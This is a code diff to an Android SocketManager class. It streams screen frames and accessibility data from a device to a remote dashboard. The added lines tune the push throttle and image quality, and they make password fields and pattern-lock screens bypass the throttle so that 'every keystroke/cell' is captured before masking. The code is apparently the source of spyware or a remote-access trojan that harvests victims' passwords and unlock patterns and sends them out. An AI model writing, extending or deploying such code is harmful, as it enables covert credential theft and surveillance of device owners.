@@ -123,6 +123,12 @@ public class SocketManager {
     // True while a rate-switch restart has been submitted to the executor (prevents storms)
     private volatile boolean loopRestartPending   = false;
 
+    // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
+    // The internal 50ms tick still runs (for password/pattern capture), but dashboard
+    // screen:update pushes are rate-limited to this value. Default 2000ms is safe for 3G/4G.
+    private volatile long screenReaderDashboardIntervalMs  = 2000L;
+    private volatile long lastScreenReaderDashboardPushMs  = 0L;
+
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
     private volatile String lastFrameFingerprint = null;
     // Count consecutive identical frames — allow up to 4 duplicates before skip
@@ -1459,8 +1465,10 @@ public class SocketManager {
                     // 360 px wide for 3G — encodes ~2× faster than 540 px, ~55 % less data.
                     Bitmap scaled = scaleBitmapToWidth(frame, 360);
                     if (scaled != frame) frame.recycle();
-                    // Adaptive quality: start at 35 %, cap raw size at 40 KB (safe for 3G uplinks).
-                    String b64 = bitmapToBase64Adaptive(scaled, 35, 40_000);
+                    // Adaptive quality: start at 45 % (up from 35 %) — the dashboard now uses canvas
+                    // rendering which keeps the previous frame visible while the next decodes, so we
+                    // can afford clearer frames. Adaptive logic still drops to 20 % if frame exceeds 40 KB.
+                    String b64 = bitmapToBase64Adaptive(scaled, 45, 40_000);
                     scaled.recycle();
                     if (b64 != null) {
                         JSONObject d = new JSONObject();
@@ -1822,10 +1830,16 @@ public class SocketManager {
             }
 
             case "screen_reader_stream_start": {
+                // Read the interval the dashboard requests (1000-5000ms; default 2000ms for 3G safety).
+                // The internal 50ms tick keeps running for password/pattern capture,
+                // but screen:update pushes to the dashboard are throttled to this value.
+                final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 2000L));
                 // Serialize through heartbeatExecutor (single-threaded) so that a
                 // stream_stop submitted just before cannot overtake this start.
                 final UnifiedAccessibilityService finalSvc = accessSvc;
                 heartbeatExecutor.execute(() -> {
+                    screenReaderDashboardIntervalMs = requestedIntervalMs;
+                    lastScreenReaderDashboardPushMs = 0L; // allow first frame immediately
                     manualRecordingActive = true;
                     ScheduledFuture<?> srf = screenReaderFuture;
                     if (srf == null || srf.isDone() || srf.isCancelled()) {
@@ -1834,7 +1848,7 @@ public class SocketManager {
                 });
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
-                ok.put("message", "Stream started — screen reader continues on device");
+                ok.put("message", "Stream started — push interval " + requestedIntervalMs + "ms");
                 return ok;
             }
 
@@ -2104,7 +2118,16 @@ public class SocketManager {
                 // (manualRecordingActive) AND the live channel is up.
                 // Use sendLiveOnly — screen updates must NOT fall back to the primary command
                 // channel; that would queue high-frequency accessibility frames as commands.
-                if (manualRecordingActive && liveConnected) {
+                //
+                // Dashboard push throttle: honor the intervalMs from screen_reader_stream_start.
+                // Password fields and pattern screens bypass the throttle — every keystroke/cell
+                // must be captured immediately before masking or fading occurs.
+                long nowMs = System.currentTimeMillis();
+                boolean throttleBypass = hasPasswordInput || inPatternScreenMode;
+                boolean throttleOk = throttleBypass
+                    || (nowMs - lastScreenReaderDashboardPushMs) >= screenReaderDashboardIntervalMs;
+                if (manualRecordingActive && liveConnected && throttleOk) {
+                    lastScreenReaderDashboardPushMs = nowMs;
                     // ── GZIP compression — reduces ~3-5 KB accessibility JSON to ~700 B on 3G ──
                     String compressed = gzipAndBase64(payload.toString());
                     if (compressed != null) {
